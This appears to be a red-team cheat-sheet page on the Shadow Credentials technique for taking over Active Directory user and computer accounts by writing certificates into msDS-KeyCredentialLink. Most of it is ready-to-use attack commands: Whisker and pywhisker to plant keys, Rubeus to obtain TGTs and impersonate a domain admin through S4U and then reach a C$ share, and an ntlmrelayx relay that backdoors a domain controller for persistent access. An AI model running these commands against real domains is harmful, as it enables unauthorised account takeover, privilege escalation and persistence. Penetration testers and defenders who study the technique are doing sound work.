#  Shadow Credentials

A summary and explanation of Shadow credentials mostly from the sources: [iredteam](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials) [thehacker.recipes](https://www.thehacker.recipes/a-d/movement/kerberos/shadow-credentials). Described by [Elad Shamir](https://medium.com/@elad.shamir) (Service Architect at [SpecterOps](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)) as *a technique allows an attacker to take over an AD user or computer account if the attacker can modify the target object's (user or computer account) attribute `msDS-KeyCredentialLink` and append it with alternate credentials in the form of certificates.- iredteam*.  `msDS-KeyCredentialLink` is an attribute for raw public keys of any Active Directory user and computer objects. When initialisation Kerberos authentication the pre-authenticate check run by the KDC will include a matching private key for the TGT to set if there is a match.

**Requirements**:
- Domain must have Active Directory Certificate Services and Certificate Authority configured.
- Domain must have at least one DC running with Windows Server 2016 that supports PKINIT.

***WARNING*** - [thehacker.recipes](https://www.thehacker.recipes/a-d/movement/kerberos/shadow-credentials): *The `msDS-KeyCredentialLink` feature was introduced with Windows Server 2016. However, this is not to be confused with PKINIT which was already present in Windows 2000. The `msDS-KeyCredentialLink` feature allows to link an X509 certificate to a domain object, that's all.*

1. Create an RSA key pair
2. Create an X509 certificate configured with the public key
3. Create a [KeyCredential](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/de61eb56-b75f-4743-b8af-e9be154b47af) structure featuring the raw public key and add it to the `msDs-KeyCredentialLink` attribute
4. Authenticate using PKINIT and the certificate and private key

From Windows
```powershell
# Enumerate for target account
Whisker.exe list /target:"TARGET_SAMNAME"
# Add target account
Whisker.exe add /target:"TARGET_SAMNAME"
# Manaipulate
Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"

# Show msds-keycredentiallink attribute
get-netcomputer $TARGET_SAMNAME
# Ask for TGT with Rubeus
Rubeus.exe asktgt /user:$TARGET_SAMNAME /certificate:"CERT_KEY" /domain:$Domain.$TLD /dc:$DCName.$Domain.$TLD /getcredentials /show /ptt

# Ask for TGS for DA for a coputer account takeover
# As above add a shadow credential for this time a computer 
# Whisker.exe add $newServiceName -> Rubeus.exe asktgt
Rubeus.exe s4u /dc:$DCName.$Domain.$TLD  /ticket:$TICKET== /impersonateuser:$DomainAdminUser@$Domain.$TLD /ptt /self /service:host/$server.$Domain.$TLD /altservice:cifs/$newServiceName.$Domain.$TLD

ls \\$newServiceName.$Domain.$TLD\c$

```

From Linux
```bash
pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "list"
# Add action from pywhisker is featured in ntlmrelayx
ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'
```

[thehacker.recipes](https://www.thehacker.recipes/a-d/movement/kerberos/shadow-credentials): *User objects can't edit their own `msDS-KeyCredentialLink` attribute while computer objects can. This means the following scenario could work: [trigger an NTLM authentication](https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications) from DC01, [relay it](https://github.com/ShutdownRepo/The-Hacker-Recipes/blob/master/ad/movement/kerberos/broken-reference/README.md) o DC02, make pywhisker edit DC01's attribute to create a Kerberos PKINIT pre-authentication backdoor on it, and have persistent access to DC01 with PKINIT and [pass-the-cache](https://www.thehacker.recipes/a-d/movement/kerberos/ptc). Computer objects can only edit their own `msDS-KeyCredentialLink` attribute if KeyCredential is not set already.*

## References

[SpecterOps - Shadow Credentials Post](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
[iredteam](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials)
[thehacker.recipes](https://www.thehacker.recipes/a-d/movement/kerberos/shadow-credentials)
[Elad Shamir](https://medium.com/@elad.shamir)
[KeyCredential](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/de61eb56-b75f-4743-b8af-e9be154b47af) 